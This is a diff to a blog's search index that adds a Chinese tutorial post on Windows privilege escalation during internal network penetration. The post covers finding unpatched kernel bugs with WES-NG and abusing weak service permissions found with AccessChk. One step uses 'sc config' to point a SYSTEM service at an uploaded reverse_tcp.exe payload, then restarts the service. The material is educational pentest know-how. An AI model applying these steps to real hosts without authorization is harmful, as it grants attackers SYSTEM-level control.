@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>域渗透(四)-权限提升</title>
+      <link href="/2023/09/06/%E5%9F%9F%E6%B8%97%E9%80%8F(%E5%9B%9B)-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
+      <url>/2023/09/06/%E5%9F%9F%E6%B8%97%E9%80%8F(%E5%9B%9B)-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
+      
+        <content type="html"><![CDATA[<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>权限提升可以分为横向权限提升和纵向权限提升<br>1.横向移动：同用户级别之间，由一个用户接管另一个用户权限<br>2.纵向移动：由较低用户权限获取更高的用户权限（例如获取管理员、系统级别的权限）</p><h2 id="1-系统内核漏洞提权"><a href="#1-系统内核漏洞提权" class="headerlink" title="1.系统内核漏洞提权"></a>1.系统内核漏洞提权</h2><h4 id="1-寻找系统潜在漏洞"><a href="#1-寻找系统潜在漏洞" class="headerlink" title="1.寻找系统潜在漏洞"></a>1.寻找系统潜在漏洞</h4><p>1.手动寻找可用漏洞<br>查看已安装补丁</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>可以结合系统版本和相关辅助网站寻找可用的提权漏洞</p><p>2.借助WES-NG查找可用漏洞<br><a href="https://github.com/bitsadmin/wesng">GitHub - bitsadmin&#x2F;wesng: Windows Exploit Suggester - Next Generation</a><br>a.更新最新的漏洞库数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 wes.py --update</span><br></pre></td></tr></table></figure><p>b.执行systeminfo并将结果保存到sysinfo.txt,然后用WES-NG进行检查</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;systeminfo &gt; sysinfo.txt</span><br><span class="line">C:\&gt;python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot;</span><br><span class="line">#--impact指定漏洞类型为提权漏洞</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061024328.png" alt="image.png"><br>c.寻找所有已公开的exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot; --exploits-only</span><br></pre></td></tr></table></figure><p>以测试机Win7为例<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061033001.png" alt="image.png"></p><h4 id="2-确定并利用漏洞"><a href="#2-确定并利用漏洞" class="headerlink" title="2.确定并利用漏洞"></a>2.确定并利用漏洞</h4><p>确认漏洞后，通过各种方式搜寻漏洞利用程序上传利用。</p><h2 id="2-系统服务提权"><a href="#2-系统服务提权" class="headerlink" title="2.系统服务提权"></a>2.系统服务提权</h2><p>一些应用软件会注册一些服务，大多数服务在计算机开机时以SYSTEM权限启动。<br>应用软件在注册服务时，会在以下路径中创建相应的注册表项</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services</span><br></pre></td></tr></table></figure><p>以GoogleUpdate为例<br>gupdate服务ImagePath指向系统服务所启动的二进制程序<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061052368.png" alt="image.png"><br>大多数服务以SYSTEM权限启动，如果让服务启动执行其他程序，该程序就能随着服务的启动获得系统权限，这是利用系统服务提权的主要思路</p><h4 id="1-不安全的服务权限"><a href="#1-不安全的服务权限" class="headerlink" title="1.不安全的服务权限"></a>1.不安全的服务权限</h4><p>ACL定义安全对象访问控制策略，用于规定哪些主体对其拥有访问权限和拥有什么样的权限<br>Windows系统服务通过ACL来指定用户对其拥有的权限。<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309062153146.png" alt="image.png"></p><p>假设目标主机的用户在配置服务时存在疏忽，使得低权限用户对高权限下运行的系统服务拥有更改服务配置的权限(SERVICE_QUERY_CONFIG或SERVICE_ALL_ACCESS),就可以通过这个低权限用户直接修改服务启动时的二进制文件路径。</p><p>实战中AccessChk工具可以枚举目标主机上存在权限缺陷的系统服务。AccessChk可以用来枚举或查看系统中指定用户、组对特定资源的访问权限。</p><p>低权限用户可以通过可以通过检查”Authenticated Users”组和”INTERACTIVE”组对系统服务的权限，<br>1.前者为经过身份验证的用户，包含系统中所有使用用户名、密码登录并通过验证的账户<br>2.后者为交互式用户组，包含系统中所有直接登录到计算机进行操作的用户<br>默认情况下这两个组为计算机本地“Users”的成员。<br>下载地址:<a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p><p>1.检查Authenticated Users<br>枚举目标主机”Authenticated Users”组是否具有更改服务配置的权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</span><br></pre></td></tr></table></figure><p>2.若InsproSvc服务具有SERVICE_QUERY_CONFIG权限，执行以下命令，该服务启动时执行的二进制文件替换为预先上传的攻击载荷，当服务重启时，载荷会随着服务的启动继承系统权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc config InsproSvc binpath= &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot;</span><br><span class="line">#binpath,指定服务的二进制文件路径,注意=后面必须有一个空格</span><br></pre></td></tr></table></figure><p>3.如果当前用户对该服务拥有SERVICE_STOP和SERVICE_START权限，意味着用户拥有对服务的重启权限，可以直接执行以下命令重启服务。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc stop &lt;Service Name&gt;</span><br><span class="line">sc start &lt;Service Name&gt;</span><br></pre></td></tr></table></figure><p>如果没有权限，可以对启动类型为”自动”的服务尝试通过重新启动计算机的方法来实现服务重启</p><p>(持续更新中)</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 内网渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>域渗透(三)-端口转发与内网代理</title>
       <link href="/2023/09/06/%E5%9F%9F%E6%B8%97%E9%80%8F(%E4%B8%89)-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/"/>
       <url>/2023/09/06/%E5%9F%9F%E6%B8%97%E9%80%8F(%E4%B8%89)-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/</url>
